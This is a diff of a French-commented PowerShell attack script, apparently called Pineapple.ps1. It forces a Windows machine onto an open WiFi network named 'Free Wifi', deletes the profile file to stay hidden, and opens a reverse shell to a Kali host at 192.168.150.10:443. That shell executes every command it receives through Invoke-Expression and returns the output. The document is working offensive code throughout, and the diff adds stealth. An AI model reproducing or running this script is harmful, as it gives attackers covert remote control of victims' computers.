@@ -1,16 +1,9 @@
-<# 
-  Script Pineapple.ps1
-  - Crée un profil WiFi (SSID Open)
-  - Se connecte automatiquement à ce réseau
-  - Lance un reverse shell PowerShell vers Kali
-#>
-
 # CONFIGURATION
 $SSID = "Free Wifi"
 $KALI_IP = "192.168.150.10"
 $KALI_PORT = 443
 
-# Génère le profil WiFi XML
+# Génère le profil WiFi
 $SSIDHEX = ($SSID.ToCharArray() | ForEach-Object { '{0:X}' -f ([int]$_) }) -join ''
 $xml = @"
 <?xml version="1.0"?>
@@ -36,28 +29,34 @@ $xml = @"
 </WLANProfile>
 "@
 
-# Sauvegarde le fichier XML dans le dossier TEMP
+# Écriture temporaire du profil
 $profilePath = "$env:TEMP\wifi_$($SSID).xml"
 $xml | Out-File -FilePath $profilePath -Encoding ASCII -Force
 
-# Ajoute le profil et se connecte au WiFi
+# Ajoute le profil et connecte
 netsh wlan add profile filename="$profilePath" > $null
-netsh wlan connect name="$SSID" > $null
+netsh wlan connect name="$SSID" > $null 2>&1
 
-# Attend quelques secondes la connexion réseau
-Start-Sleep -Seconds 25
+# Supprime le fichier pour rester furtif
+Remove-Item $profilePath -Force -ErrorAction SilentlyContinue
 
-# Lancement du reverse shell PowerShell
+# Attente pour laisser le temps au réseau
+Start-Sleep -Seconds 15
+
+# Reverse shell
 try {
-    $client = New-Object System.Net.Sockets.TCPClient($KALI_IP, $KALI_PORT)
-    $stream = $client.GetStream()
-    [byte[]]$bytes = 0..65535 | % { 0 }
+    $client = New-Object System.Net.Sockets.TCPClient($KALI_IP, $KALI_PORT);
+    $stream = $client.GetStream();
+    [byte[]]$bytes = 0..65535 | %{0};
+
+    $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(500, 1000)
+
     while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
-        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
-        $sendback2 = $sendback + "PS " + (pwd).Path + "> "
-        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-        $stream.Write($sendbyte, 0, $sendbyte.Length)
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String );
+        $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+        $stream.Write($sendbyte,0,$sendbyte.Length);
         $stream.Flush()
     }
     $client.Close()
